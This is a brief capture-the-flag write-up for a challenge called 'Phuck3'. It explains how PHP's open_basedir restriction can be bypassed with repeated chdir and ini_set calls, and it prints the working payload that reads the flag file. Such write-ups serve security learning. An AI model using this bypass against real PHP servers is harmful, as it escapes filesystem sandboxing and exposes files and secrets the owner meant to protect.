## Phuck3

This challenge was about bypassing PHP open_basedir when having a restricted arbitrary PHP code execution. Most of commons functions to execute commands were blocked.

The initial solution that was intended used the following facts :
- open_basedir can be tampered at runtime with ini_set, but is restricted by open_basedir itself (in other words, we should only be able to harden the existing rule)
- open_basedir is stored as a non-resolved absolute or relative path

In this case, a folder __img__ was in the webroot. The following payload allows to bypass completly open_basedir :

```
chdir('img');
ini_set('open_basedir','..'); // <-- authorized, as .. is compliant with the original rule
chdir('..');chdir('..');chdir('..');chdir('..'); // but yeah, stored non-resolved, so that is also ok.
ini_set('open_basedir','/'); // <-- we're in /, the current rule is '..' so / is compliant with the current rule :).
echo file_get_contents('flag');
```

Tada!
